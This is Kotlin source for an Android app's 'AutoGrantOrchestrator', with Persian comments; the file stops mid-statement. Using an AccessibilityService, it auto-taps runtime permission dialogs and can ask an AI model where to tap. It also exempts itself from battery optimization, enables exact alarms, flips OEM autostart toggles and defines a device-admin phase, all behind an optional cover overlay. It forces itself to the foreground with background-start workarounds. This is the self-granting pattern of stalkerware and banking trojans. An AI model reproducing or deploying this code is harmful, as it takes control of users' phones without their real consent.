package com.base.realtime.access

import android.accessibilityservice.AccessibilityService
import android.app.Activity
import android.app.ActivityOptions
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import com.base.realtime.R
import com.base.realtime.oem.BackgroundAccess
import com.base.realtime.ui.MainActivity
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * تنها orchestrator صف auto-grant بعد از Accessibility.
 */
internal object AutoGrantOrchestrator {

    private const val TAG = "AutoGrant"
    private const val REQUEST_BASE = 9400
    private const val REQ_BATTERY = 9401
    private const val REQ_ALARM = 9402
    private const val OEM_AI_MAX_ROUNDS = 10

    private val main = Handler(Looper.getMainLooper())
    private val bringUpLock = AtomicBoolean(false)
    private val launchSeq = AtomicInteger(0)

    private var index = 0
    private var host: Activity? = null
    private var phase = Phase.IDLE
    private var awaitingReturn = false
    private var ignoreResumeUntil = 0L
    private var batteryAttempts = 0
    private var alarmAttempts = 0
    private var oemOpened = false
    private var oemSettled = false
    private var oemAiRounds = 0
    /** چند دور پشت‌سرهم snapshot بدون nearApp — بعد از ۲ تا اسکرول اجباری. */
    private var oemNearAppMisses = 0
    private var oemNavSteps = 0
    private var oemNavBacks = 0
    private var oemPickerConfirmed = false
    private var oemAppInfoTried = false
    private var settingsPollToken = 0
    private var settingsGoneTicks = 0

    private enum class Phase {
        IDLE,
        LEAVING,
        RUNTIME,
        BATTERY,
        EXACT_ALARM,
        OEM_AUTOSTART,
        DEVICE_ADMIN,
        DONE,
    }

    fun shouldRun(context: Context): Boolean = AutoGrantProgress.shouldRun(context)

    fun isActive(): Boolean = host != null || phase == Phase.LEAVING || LeaveA11ySettings.isActive()

    /** تنها ورودی بعد از اتصال Accessibility. */
    fun onAccessibilityConnected(service: AccessibilityService) {
        if (!shouldRun(service)) {
            Log.i(TAG, "onAccessibilityConnected skip")
            main.postDelayed({ GrantReporter.sync(service) }, 1_500L)
            return
        }
        if (!bringUpLock.compareAndSet(false, true)) {
            Log.i(TAG, "onAccessibilityConnected already bringing up")
            return
        }
        main.postDelayed({ bringUpLock.set(false) }, 18_000L)
        phase = Phase.LEAVING
        Log.i(TAG, "onAccessibilityConnected → launch now + leave settings")
        showCoverIfNeeded(service, 1)
        // اول Activity مات را استارت کن (زیر/کنار Settings)، بعد Back تا Settings بسته شود
        launchHost(service)
        LeaveA11ySettings.start(service) {
            onLeftSettings(service)
        }
    }

    private fun onLeftSettings(service: AccessibilityService) {
        Log.i(TAG, "onLeftSettings shouldRun=${shouldRun(service)} host=${host != null}")
        if (host != null) {
            // host آماده و احتمالاً وسط requestPermissions — دوباره launch نکن (دیالوگ کنسل می‌شود)
            Log.i(TAG, "onLeftSettings host already ready → skip relaunch")
            if (phase == Phase.LEAVING || phase == Phase.IDLE) phase = Phase.RUNTIME
            return
        }
        if (!shouldRun(service)) {
            phase = Phase.IDLE
            bringMain(service)
            return
        }
        showCoverIfNeeded(service, 1)
        launchHost(service)
        for (delay in longArrayOf(200L, 500L, 900L, 1_500L, 2_500L, 4_000L)) {
            main.postDelayed({
                if (host != null) {
                    launchHost(service) // reorder
                    return@postDelayed
                }
                if (!shouldRun(service)) {
                    bringMain(service)
                    return@postDelayed
                }
                Log.i(TAG, "retry launchHost after leave delayMs=$delay")
                launchHost(service)
            }, delay)
        }
    }

    /**
     * از Activity جلو (مثلاً Launch بعد از Back از Settings):
     * MIUI startActivity پس‌زمینه را می‌بلعد؛ از foreground کار می‌کند.
     */
    fun launchFromForeground(activity: Activity) {
        if (!shouldRun(activity) || activity.isFinishing) return
        if (host != null) {
            Log.i(TAG, "launchFromForeground host already ready")
            return
        }
        Log.i(TAG, "launchFromForeground ${activity.javaClass.simpleName}")
        try {
            activity.startActivity(
                Intent(activity, AutoGrantActivity::class.java).apply {
                    addFlags(
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                            Intent.FLAG_ACTIVITY_SINGLE_TOP or
                            Intent.FLAG_ACTIVITY_REORDER_TO_FRONT,
                    )
                },
            )
        } catch (t: Throwable) {
            Log.w(TAG, "launchFromForeground startActivity failed → host=this", t)
            onHostReady(activity)
        }
    }

    /** Launch/Main: اگر host نداریم از foreground استارت کن؛ وگرنه صف را از سرویس بیاور. */
    fun resumeIfNeeded(context: Context) {
        if (!shouldRun(context)) return
        if (host != null) return
        if (context is Activity && !context.isFinishing) {
            launchFromForeground(context)
            return
        }
        if (isActive()) return
        val svc = AgentAccessibilityService.get()
        if (svc != null) {
            onAccessibilityConnected(svc)
        } else {
            launchHost(context)
        }
    }

    fun onHostDestroyed(activity: Activity) {
        if (host !== activity) return
        val dead = phase
        host = null
        if (dead == Phase.DONE || dead == Phase.IDLE) return
        if (!shouldRun(activity)) return
        Log.i(TAG, "host destroyed mid-grant phase=$dead → relaunch")
        val svc = AgentAccessibilityService.get() ?: return
        main.postDelayed({
            if (host != null || phase == Phase.DONE || phase == Phase.IDLE) return@postDelayed
            if (!shouldRun(svc)) return@postDelayed
            launchHost(svc)
        }, 350L)
    }

    fun onHostReady(activity: Activity) {
        if (host === activity && phase != Phase.IDLE && phase != Phase.DONE) {
            Log.i(TAG, "onHostReady same host")
            return
        }
        AutoGrantDebug.apply(com.base.realtime.config.AppConfigs.load(activity))
        AutoGrantTiming.resetSession()
        AutoGrantTiming.i("onHostReady ${activity.javaClass.simpleName} useAi=${AutoGrantDebug.useAi}")
        // Engine را گرم کن تا AI فوری در دسترس باشد
        runCatching {
            val eng = com.base.realtime.RealtimeApp.engine(activity)
            UiGuideBridge.bindEngine(eng)
            com.base.realtime.service.RealtimeService.start(activity)
            eng.ensureStarted()
        }.onFailure { AutoGrantTiming.w("engine warm failed: $it") }
        host = activity
        index = 0
        phase = Phase.RUNTIME
        awaitingReturn = false
        ignoreResumeUntil = 0L
        batteryAttempts = 0
        alarmAttempts = 0
        oemOpened = false
        oemSettled = false
        oemAiRounds = 0
        oemNearAppMisses = 0
        oemNavSteps = 0
        oemNavBacks = 0
        oemPickerConfirmed = false
        oemAppInfoTried = false
        settingsGoneTicks = 0
        PermissionDialogTapper.mode = TapMode.RUNTIME_DIALOG
        PermissionsAutoGrant.arm(activity, durationMs = 180_000L)
        showCoverIfNeeded(activity, 1)
        advance(activity)
    }

    fun onHostResume(activity: Activity) {
        if (host !== activity || !awaitingReturn) return
        val wait = ignoreResumeUntil - SystemClock.uptimeMillis()
        if (wait > 0L) {
            // قبلاً همین‌جا return می‌کردیم و دیگر هیچ‌وقت نتیجهٔ باتری چک نمی‌شد
            Log.i(TAG, "onHostResume deferred ${wait}ms phase=$phase")
            main.postDelayed({
                if (host === activity && awaitingReturn) onHostResume(activity)
            }, wait + 40L)
            return
        }
        // OEM + useAi: resume زودهنگام جلسه را قبل از جواب AI تمام نکند
        if (phase == Phase.OEM_AUTOSTART && AutoGrantDebug.useAi && !oemSettled) {
            Log.i(TAG, "onHostResume OEM — ignore (waiting AI/toggle)")
            return
        }
        if (phase == Phase.DEVICE_ADMIN) return
        if (phase == Phase.BATTERY || phase == Phase.EXACT_ALARM || phase == Phase.OEM_AUTOSTART) {
            if (isForeignSettingsOnTop()) {
                Log.i(TAG, "onHostResume — settings still on top, keep polling phase=$phase")
                return
            }
        }
        // Battery/Alarm: اگر هنوز grant نشده و AI/poll فعال است، زود FAIL نزن
        if (phase == Phase.BATTERY &&
            !BackgroundAccess.isIgnoringBatteryOptimizations(activity) &&
            (AutoGrantDebug.useAi || UiGuideBridge.isBusy())
        ) {
            Log.i(TAG, "onHostResume BATTERY — grant not visible yet, keep poll")
            return
        }
        if (phase == Phase.EXACT_ALARM &&
            !BackgroundAccess.canScheduleExactAlarms(activity) &&
            (AutoGrantDebug.useAi || UiGuideBridge.isBusy())
        ) {
            Log.i(TAG, "onHostResume ALARM — grant not visible yet, keep poll")
            return
        }
        completeSettingsReturn(activity)
    }

    private fun completeSettingsReturn(activity: Activity, alreadyLoggedGrant: Boolean = false) {
        if (host !== activity || !awaitingReturn) return
        // فاز را همین‌جا قفل کن — کال‌بک تأخیری نباید OEM را با نتیجهٔ باتری بکشد
        val returningFrom = phase
        if (returningFrom == Phase.OEM_AUTOSTART && AutoGrantDebug.useAi && !oemSettled) {
            Log.i(TAG, "completeSettingsReturn OEM useAi — ignore (AI loop owns completion)")
            return
        }
        awaitingReturn = false
        settingsPollToken++ // cancel poll
        if (returningFrom != Phase.OEM_AUTOSTART) {
            PermissionDialogTapper.mode = TapMode.IDLE
        }
        main.postDelayed({
            if (host !== activity || activity.isFinishing) return@postDelayed
            if (phase != returningFrom) {
                AutoGrantTiming.i(
                    "completeSettingsReturn skip — phase moved from=$returningFrom to=$phase",
                )
                return@postDelayed
            }
            when (returningFrom) {
                Phase.BATTERY -> {
                    val ok = BackgroundAccess.isIgnoringBatteryOptimizations(activity)
                    if (ok) {
                        if (!alreadyLoggedGrant) AutoGrantTiming.i("SUCCESS battery unrestricted → next")
                        GrantReporter.sync(activity)
                    } else {
                        AutoGrantTiming.w("FAIL battery unrestricted (attempt=$batteryAttempts)")
                    }
                    if (ok || batteryAttempts >= 2) {
                        phase = Phase.EXACT_ALARM
                    }
                    advance(activity)
                }
                Phase.EXACT_ALARM -> {
                    val ok = BackgroundAccess.canScheduleExactAlarms(activity)
                    if (ok) {
                        if (!alreadyLoggedGrant) AutoGrantTiming.i("SUCCESS exact alarm → oem")
                        GrantReporter.sync(activity)
                    } else {
                        AutoGrantTiming.w("FAIL exact alarm (attempt=$alarmAttempts)")
                    }
                    if (ok || alarmAttempts >= 2) {
                        phase = Phase.OEM_AUTOSTART
                    }
                    advance(activity)
                }
                Phase.OEM_AUTOSTART -> {
                    // useAi بالاتر return شد؛ اینجا فقط مسیر rule
                    if (AutoGrantProgress.isOemGranted(activity)) {
                        Log.i(TAG, "SUCCESS oem autostart toggle confirmed on resume")
                        GrantReporter.sync(activity)
                    } else {
                        Log.w(TAG, "FAIL oem autostart toggle not confirmed on resume")
                        AutoGrantProgress.markOemGiveUp(activity)
                    }
                    phase = Phase.DONE
                    finish(activity)
                }
                else -> advance(activity)
            }
        }, if (alreadyLoggedGrant) 80L else 400L)
    }

    /**
     * بعد از اجرای اکشن‌های AI: اگر هنوز منتظر برگشت از Settings هستیم،
     * نتیجه را چک کن تا به OEM برسیم (مدل دیگر BACK نزند).
     */
    fun onAiGuideFinished(phaseName: String, ok: Boolean) {
        main.post {
            val activity = host ?: return@post
            if (activity.isFinishing) return@post
            AutoGrantTiming.i("onAiGuideFinished phase=$phaseName ok=$ok awaiting=$awaitingReturn current=$phase")
            when (phaseName) {
                "BATTERY" -> {
                    if (phase != Phase.BATTERY) return@post
                    // بعد از tap صبر کن تا PowerManager واقعاً unrestricted شود — زود FAIL نزن
                    waitForBatteryGrantThenAdvance(activity, attempt = 0)
                }
                "EXACT_ALARM" -> {
                    if (phase != Phase.EXACT_ALARM) return@post
                    waitForAlarmGrantThenAdvance(activity, attempt = 0)
                }
                "OEM_AUTOSTART" -> {
                    if (phase != Phase.OEM_AUTOSTART || oemSettled) return@post
                    handleOemAiRoundFinished(activity, ok)
                }
                "RUNTIME" -> {
                    // اگر AI نود اشتباه زد، callback مجوز نمی‌آید — بعد از کمی صبر از grant واقعی جلو برو
                    main.postDelayed({
                        if (host !== activity || activity.isFinishing) return@postDelayed
                        if (phase != Phase.RUNTIME) return@postDelayed
                        syncRuntimeIndex(activity)
                        if (index >= AutoGrantProgress.effectiveRuntimePermissions(activity).size) {
                            AutoGrantTiming.i("RUNTIME after AI — all granted → battery")
                            UiGuideBridge.abortStale("runtime done")
                            phase = Phase.BATTERY
                            updateOverlay(activity)
                            advance(activity)
                        } else if (AutoGrantDebug.useAi) {
                            AutoGrantTiming.w(
                                "RUNTIME after AI — still missing perms index=$index → re-kick AI",
                            )
                            PermissionDialogTapper.clearAiSuccessGate()
                            PermissionDialogTapper.resetAiForceSchedule()
                            PermissionDialogTapper.mode = TapMode.RUNTIME_DIALOG
                            AgentAccessibilityService.get()?.let {
                                PermissionDialogTapper.scheduleForceAi(it, delayMs = 120L, force = true)
                            }
                            main.postDelayed({
                                if (host !== activity || phase != Phase.RUNTIME) return@postDelayed
                                syncRuntimeIndex(activity)
                                if (index >= AutoGrantProgress.effectiveRuntimePermissions(activity).size) {
                                    UiGuideBridge.abortStale("runtime done late")
                                    phase = Phase.BATTERY
                                    advance(activity)
                                } else {
                                    advance(activity)
                                }
                            }, 2_200L)
                        } else {
                            AutoGrantTiming.w(
                                "RUNTIME after AI — still missing perms index=$index → rule tapper fallback",
                            )
                            PermissionDialogTapper.allowRuleFallbackOnce()
                            PermissionDialogTapper.mode = TapMode.RUNTIME_DIALOG
                            val svc = AgentAccessibilityService.get()
                            if (svc != null) {
                                PermissionDialogTapper.tryRuleTapNow(svc)
                            }
                            main.postDelayed({
                                if (host !== activity || phase != Phase.RUNTIME) return@postDelayed
                                syncRuntimeIndex(activity)
                                if (index >= AutoGrantProgress.effectiveRuntimePermissions(activity).size) {
                                    phase = Phase.BATTERY
                                    advance(activity)
                                } else {
                                    advance(activity)
                                }
                            }, 1_200L)
                        }
                    }, 700L)
                }
                else -> Unit
            }
        }
    }

    private fun syncRuntimeIndex(activity: Activity) {
        val perms = AutoGrantProgress.effectiveRuntimePermissions(activity)
        while (index < perms.size) {
            val p = perms[index]
            if (activity.checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED ||
                AutoGrantProgress.isDenied(activity, p)
            ) {
                index++
            } else {
                break
            }
        }
    }

    /** تیک اپ در لیست Autostart روشن شد (AI با probe، یا تپر قطعی وقتی useAi=false). */
    fun onOemAppListEnabled() {
        main.post {
            val activity = host ?: return@post
            if (phase != Phase.OEM_AUTOSTART || oemSettled) return@post
            oemSettled = true
            UiGuideBridge.abortStale("oem granted")
            PermissionDialogTapper.mode = TapMode.IDLE
            PermissionDialogTapper.resetAiForceSchedule()
            AutoGrantProgress.markOemGranted(activity)
            GrantReporter.sync(activity)
            Log.i(TAG, "SUCCESS oem autostart toggle enabled for ${activity.packageName}")
            awaitingReturn = false
            val stillInOemUi = isForeignSettingsOnTop()
            val svc = AgentAccessibilityService.get()
            // فقط اگر هنوز داخل Security Center هستیم Back بزن؛ وگرنه اپ خودمان بسته می‌شود
            if (stillInOemUi && svc != null) {
                main.postDelayed({
                    if (!isForeignSettingsOnTop()) return@postDelayed
                    runCatching {
                        svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                    }
                }, 250L)
            }
            main.postDelayed({
                if (host !== activity || activity.isFinishing) return@postDelayed
                phase = Phase.DONE
                finish(activity)
            }, if (stillInOemUi) 450L else 120L)
        }
    }

    fun onRequestPermissionsResult(
        activity: Activity,
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ): Boolean {
        val perms = AutoGrantProgress.effectiveRuntimePermissions(activity)
        if (requestCode !in REQUEST_BASE until REQUEST_BASE + perms.size.coerceAtLeast(1)) return false
        if (permissions.isEmpty() && grantResults.isEmpty()) {
            val expected = perms.getOrNull(index).orEmpty()
            Log.w(
                TAG,
                "FAIL runtime permission cancelled (empty result) → retry ${expected.substringAfterLast('.')}",
            )
            updateOverlay(activity)
            advance(activity)
            return true
        }
        var anyGranted = false
        for (i in permissions.indices) {
            val perm = permissions[i]
            val shortName = perm.substringAfterLast('.')
            val granted = i < grantResults.size &&
                grantResults[i] == PackageManager.PERMISSION_GRANTED
            if (granted) {
                Log.i(TAG, "SUCCESS runtime permission granted: $shortName ($perm)")
                anyGranted = true
            } else {
                val showRationale = activity.shouldShowRequestPermissionRationale(perm)
                Log.w(
                    TAG,
                    "FAIL runtime permission denied: $shortName ($perm) permanent=${!showRationale}",
                )
                if (!showRationale) {
                    AutoGrantProgress.markDenied(activity, perm)
                }
            }
        }
        // بعد از batch، از اول صف باقی‌مانده را با check واقعی جلو ببر
        while (index < perms.size) {
            val p = perms[index]
            if (activity.checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED ||
                AutoGrantProgress.isDenied(activity, p)
            ) {
                index++
                continue
            }
            break
        }
        if (anyGranted) GrantReporter.sync(activity)
        updateOverlay(activity)
        advance(activity)
        return true
    }

    private fun launchHost(context: Context) {
        val app = context.applicationContext
        val req = launchSeq.incrementAndGet()
        val intent = Intent(app, AutoGrantActivity::class.java).apply {
            addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_CLEAR_TOP or
                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                    Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED,
            )
        }
        val svc = context as? AccessibilityService ?: AgentAccessibilityService.get()
        val balExtras = backgroundStartOptions()
        try {
            if (svc != null) {
                if (balExtras != null) svc.startActivity(intent, balExtras) else svc.startActivity(intent)
            } else {
                if (balExtras != null) app.startActivity(intent, balExtras) else app.startActivity(intent)
            }
            Log.i(TAG, "AutoGrantActivity startActivity ok seq=$req")
        } catch (t: Throwable) {
            Log.w(TAG, "startActivity failed seq=$req", t)
        }
        // PendingIntent + BAL allow: روی Home وقتی startActivity بلعیده شده
        try {
            val flags = PendingIntent.FLAG_UPDATE_CURRENT or
                if (Build.VERSION.SDK_INT >= 23) PendingIntent.FLAG_IMMUTABLE else 0
            val pi = PendingIntent.getActivity(app, 9400 + (req % 50), intent, flags)
            if (balExtras != null && Build.VERSION.SDK_INT >= 34) {
                pi.send(app, 0, null, null, null, null, balExtras)
            } else {
                pi.send()
            }
            Log.i(TAG, "AutoGrantActivity PendingIntent.send ok seq=$req")
        } catch (t: Throwable) {
            Log.w(TAG, "PendingIntent.send failed seq=$req", t)
        }
        // MIUI: intent لانچر مثل لمس آیکون؛ بعد LaunchActivity از foreground ما را باز می‌کند.
        // سامسونگ با همین intent اپ را جلو می‌آورد و Back بعدی Activity مجوز را می‌بندد.
        if (host == null && PhoneFamily.current() != PhoneFamily.SAMSUNG) {
            try {
                val launch = app.packageManager.getLaunchIntentForPackage(app.packageName)
                if (launch != null) {
                    launch.addFlags(
                        Intent.FLAG_ACTIVITY_NEW_TASK or
                            Intent.FLAG_ACTIVITY_CLEAR_TOP or
                            Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED or
                            Intent.FLAG_ACTIVITY_SINGLE_TOP,
                    )
                    if (svc != null) {
                        if (balExtras != null) svc.startActivity(launch, balExtras) else svc.startActivity(launch)
                    } else {
                        if (balExtras != null) app.startActivity(launch, balExtras) else app.startActivity(launch)
                    }
                    Log.i(TAG, "launcher MAIN intent ok seq=$req")
                }
            } catch (t: Throwable) {
                Log.w(TAG, "launcher MAIN failed seq=$req", t)
            }
        }
    }

    private fun backgroundStartOptions(): Bundle? {
        if (Build.VERSION.SDK_INT < 34) return null
        return try {
            val opts = ActivityOptions.makeBasic()
            opts.setPendingIntentBackgroundActivityStartMode(
                ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED,
            )
            opts.toBundle()
        } catch (_: Throwable) {
            null
        }
    }

    private fun bringMain(context: Context) {
        try {
            val app = context.applicationContext
            val intent = Intent(app, MainActivity::class.java).addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_CLEAR_TOP or
                    Intent.FLAG_ACTIVITY_SINGLE_TOP,
            )
            val svc = AgentAccessibilityService.get()
            if (svc != null) svc.startActivity(intent) else app.startActivity(intent)
            val flags = PendingIntent.FLAG_UPDATE_CURRENT or
                if (Build.VERSION.SDK_INT >= 23) PendingIntent.FLAG_IMMUTABLE else 0
            PendingIntent.getActivity(app, 9501, intent, flags).send()
        } catch (t: Throwable) {
            Log.w(TAG, "bringMain failed", t)
        }
    }

    private fun showCoverIfNeeded(context: Context, step: Int) {
        if (AutoGrantDebug.hideCover) return
        val runtimeN = AutoGrantProgress.effectiveRuntimePermissions(context).size
        val total = runtimeN + 3
        val line = context.getString(R.string.perm_auto_grant_overlay_progress, step, total)
        PermissionsAutoGrant.overlayControl?.showAutoGrantOverlay(line)
    }

    private fun updateOverlay(activity: Activity) {
        if (!PermissionsAutoGrant.isArmed()) return
        val runtimeN = AutoGrantProgress.effectiveRuntimePermissions(activity).size
        val total = runtimeN + 3
        val step = when (phase) {
            Phase.RUNTIME -> (index + 1).coerceAtMost(runtimeN)
            Phase.BATTERY -> runtimeN + 1
            Phase.EXACT_ALARM -> runtimeN + 2
            Phase.OEM_AUTOSTART, Phase.DONE -> runtimeN + 3
            else -> 1
        }
        showCoverIfNeeded(activity, step.coerceAtLeast(1))
    }

    private fun advance(activity: Activity) {
        when (phase) {
            Phase.RUNTIME -> advanceRuntime(activity)
            Phase.BATTERY -> openBattery(activity)
            Phase.EXACT_ALARM -> openExactAlarm(activity)
            Phase.OEM_AUTOSTART -> openOem(activity)
            Phase.DONE -> finish(activity)
            else -> Unit
        }
    }

    private fun advanceRuntime(activity: Activity) {
        PermissionDialogTapper.mode = TapMode.RUNTIME_DIALOG
        val perms = AutoGrantProgress.effectiveRuntimePermissions(activity)
        while (index < perms.size) {
            val permission = perms[index]
            val shortName = permission.substringAfterLast('.')
            if (activity.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED) {
                Log.i(TAG, "SKIP already granted: $shortName ($permission)")
                index++
                continue
            }
            if (AutoGrantProgress.isDenied(activity, permission)) {
                Log.w(TAG, "SKIP previously denied: $shortName ($permission)")
                index++
                continue
            }
            updateOverlay(activity)
            // باقی‌ماندهٔ runtime را یک‌جا بخواه → یک دیالوگ گروه، بعد فوری باتری
            val batch = perms.drop(index).filter { perm ->
                activity.checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED &&
                    !AutoGrantProgress.isDenied(activity, perm)
            }
            if (batch.isEmpty()) {
                index = perms.size
                break
            }
            Log.i(
                TAG,
                "=====> REQUEST runtime batch: ${batch.joinToString { it.substringAfterLast('.') }} " +
                    "(${batch.size} perms)",
            )
            activity.requestPermissions(batch.toTypedArray(), REQUEST_BASE + index)
            if (AutoGrantDebug.useAi) {
                // بلافاصله بعد از نمایش دیالوگ AI را بخواه — منتظر storm رویدادها نمان
                main.postDelayed({
                    val svc = AgentAccessibilityService.get() ?: return@postDelayed
                    if (phase != Phase.RUNTIME) return@postDelayed
                    PermissionDialogTapper.scheduleForceAi(svc, delayMs = 100L)
                }, 100L)
            }
            return
        }
        AutoGrantTiming.i("RUNTIME queue finished → battery")
        UiGuideBridge.abortStale("runtime→battery")
        phase = Phase.BATTERY
        updateOverlay(activity)
        advance(activity)
    }

    private fun openBattery(activity: Activity) {
        if (BackgroundAccess.isIgnoringBatteryOptimizations(activity)) {
            GrantReporter.sync(activity)
            AutoGrantTiming.i("SUCCESS battery unrestricted (already) → exact alarm")
            UiGuideBridge.abortStale("battery already")
            phase = Phase.EXACT_ALARM
            advance(activity)
            return
        }
        if (batteryAttempts >= 2) {
            AutoGrantTiming.w("FAIL battery unrestricted after $batteryAttempts attempts → skip")
            UiGuideBridge.abortStale("battery skip")
            phase = Phase.EXACT_ALARM
            advance(activity)
            return
        }
        batteryAttempts++
        UiGuideBridge.abortStale("open battery")
        PermissionDialogTapper.clearAiSuccessGate()
        PermissionDialogTapper.resetAiForceSchedule()
        PermissionDialogTapper.mode = TapMode.SETTINGS_ALLOW
        updateOverlay(activity)
        awaitingReturn = true
        settingsGoneTicks = 0
        ignoreResumeUntil = SystemClock.uptimeMillis() + 1_800L
        AutoGrantTiming.i("=====> REQUEST battery unrestricted (attempt=$batteryAttempts)")
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            @Suppress("DEPRECATION")
            activity.startActivityForResult(intent, REQ_BATTERY)
            startSettingsPoll(activity, Phase.BATTERY)
            kickAiForPhase(Phase.BATTERY, delayMs = 280L)
        } catch (t: Throwable) {
            Log.w(TAG, "FAIL battery intent", t)
            awaitingReturn = false
            phase = Phase.EXACT_ALARM
            advance(activity)
        }
    }

    /** بعد از باز شدن Settings/OEM — AI را kick کن (منتظر event نمان؛ SMS ممکن است هنوز busy باشد). */
    private fun kickAiForPhase(expected: Phase, delayMs: Long) {
        if (!AutoGrantDebug.useAi) return
        if (expected == Phase.OEM_AUTOSTART) {
            main.postDelayed({ waitForOemUiThenKickAi(attempt = 0) }, delayMs)
            return
        }
        main.postDelayed({
            if (phase != expected) return@postDelayed
            val svc = AgentAccessibilityService.get() ?: return@postDelayed
            PermissionDialogTapper.scheduleForceAi(svc, delayMs = 50L, force = true)
        }, delayMs)
    }

    /**
     * یک دور AI روی لیست Autostart: probe → در صورت نیاز اسکرول اجباری → دوباره AI.
     */
    private fun handleOemAiRoundFinished(activity: Activity, ok: Boolean) {
        oemAiRounds++
        val svc = AgentAccessibilityService.get()
        val nearApp = UiGuideBridge.lastNearAppCount
        if (nearApp > 0) {
            oemNearAppMisses = 0
        } else {
            oemNearAppMisses++
        }
        AutoGrantTiming.i(
            "OEM AI round=$oemAiRounds ok=$ok nearApp=$nearApp nearMisses=$oemNearAppMisses",
        )
        if (!AutoGrantDebug.useAi) {
            if (ok) {
                PermissionDialogTapper.allowRuleFallbackOnce()
                svc?.let { PermissionDialogTapper.tryRuleTapNow(it) }
            }
            return
        }
        main.post { settleOemAfterAi(activity, ok, look = 0) }
    }

    /** لیست Autostart اغلب دیرتر از جواب مدل پر می‌شود. تا آن لحظه اسکرول و LLM اضافه نزن. */
    private fun settleOemAfterAi(activity: Activity, ok: Boolean, look: Int) {
        if (host !== activity || phase != Phase.OEM_AUTOSTART || oemSettled) return
        val svc = AgentAccessibilityService.get()
        val enabled = svc?.let { PermissionDialogTapper.probeOemAppToggleEnabled(it) }
        if (enabled == true) {
            if (!oemPickerConfirmed && svc != null && PermissionDialogTapper.confirmOemPicker(svc)) {
                oemPickerConfirmed = true
                AutoGrantTiming.i("OEM picker confirm tapped")
                main.postDelayed({
                    if (host !== activity || phase != Phase.OEM_AUTOSTART || oemSettled) return@postDelayed
                    settleOemAfterAi(activity, ok, look = 0)
                }, 600L)
                return
            }
            AutoGrantTiming.i("OEM AI confirmed toggle ON (probe) round=$oemAiRounds")
            onOemAppListEnabled()
            return
        }
        val surface = svc?.let { PermissionDialogTapper.oemSurface(it) }
        if (surface == PermissionDialogTapper.OemSurface.HUB ||
            surface == PermissionDialogTapper.OemSurface.CONFIRM_DIALOG ||
            surface == PermissionDialogTapper.OemSurface.RESTRICT_LIST
        ) {
            AutoGrantTiming.i("OEM after AI — $surface, navigate instead of scrolling")
            waitForOemUiThenKickAi(0)
            return
        }
        val nearApp = UiGuideBridge.lastNearAppCount
        if (svc != null && (nearApp > 0 || PermissionDialogTapper.oemListLooksReady(svc))) {
            if (PermissionDialogTapper.guideOemAppToggle(svc, allowScroll = look >= 6)) {
                AutoGrantTiming.i("OEM local toggle after AI (skipped extra LLM) round=$oemAiRounds look=$look")
                return
            }
        }
        if (look < 6) {
            main.postDelayed({ settleOemAfterAi(activity, ok, look + 1) }, 120L)
            return
        }
        if (oemAiRounds >= OEM_AI_MAX_ROUNDS) {
            AutoGrantTiming.w("OEM AI — toggle not confirmed after $oemAiRounds rounds")
            return
        }
        val forceScroll = oemNearAppMisses >= 2 || (!ok && nearApp == 0)
        if (forceScroll && svc != null) {
            AutoGrantTiming.i("OEM force scroll before next AI (nearMisses=$oemNearAppMisses)")
            PermissionDialogTapper.scrollByGuide(svc, forward = true)
            oemNearAppMisses = 0
            main.postDelayed({
                if (host !== activity || phase != Phase.OEM_AUTOSTART || oemSettled) return@postDelayed
                if (PermissionDialogTapper.guideOemAppToggle(svc)) {
                    AutoGrantTiming.i("OEM local toggle after force scroll")
                    return@postDelayed
                }
                kickOemAiAgain()
            }, 200L)
            return
        }
        AutoGrantTiming.w("OEM after AI — re-kick AI round=$oemAiRounds")
        kickOemAiAgain()
    }

    private fun kickOemAiAgain() {
        if (phase != Phase.OEM_AUTOSTART || oemSettled) return
        PermissionDialogTapper.clearAiSuccessGate()
        PermissionDialogTapper.resetAiForceSchedule()
        AgentAccessibilityService.get()?.let {
            PermissionDialogTapper.scheduleForceAi(it, delayMs = 60L, force = true)
        }
    }

    /**
     * تا وقتی لیست اپ با سوییچ نیامده AI نزن.
     * دیالوگ Allow/Deny و داشبورد باتری سامسونگ لیست Autostart نیستند.
     */
    private fun waitForOemUiThenKickAi(attempt: Int) {
        if (phase != Phase.OEM_AUTOSTART || oemSettled) return
        val activity = host ?: return
        val svc = AgentAccessibilityService.get() ?: return
        when (val surface = PermissionDialogTapper.oemSurface(svc)) {
            PermissionDialogTapper.OemSurface.CONFIRM_DIALOG -> {
                if (oemNavBacks < 2) {
                    oemNavBacks++
                    AutoGrantTiming.i("OEM confirm dialog — back #$oemNavBacks")
                    svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                }
                if (attempt < 24) {
                    main.postDelayed({ waitForOemUiThenKickAi(attempt + 1) }, 450L)
                } else {
                    giveUpOem(activity, "stuck on confirm dialog")
                }
                return
            }
            PermissionDialogTapper.OemSurface.RESTRICT_LIST -> {
                if (oemNavBacks >= 2) {
                    giveUpOem(activity, "sleeping-apps list")
                    return
                }
                oemNavBacks++
                AutoGrantTiming.w("OEM sleeping-apps list — back #$oemNavBacks")
                svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                main.postDelayed({
                    if (host !== activity || phase != Phase.OEM_AUTOSTART || oemSettled) return@postDelayed
                    val pkg = topForeignPackage(svc).lowercase()
                    if (!pkg.contains("lool") && !pkg.contains("samsung.android.sm")) {
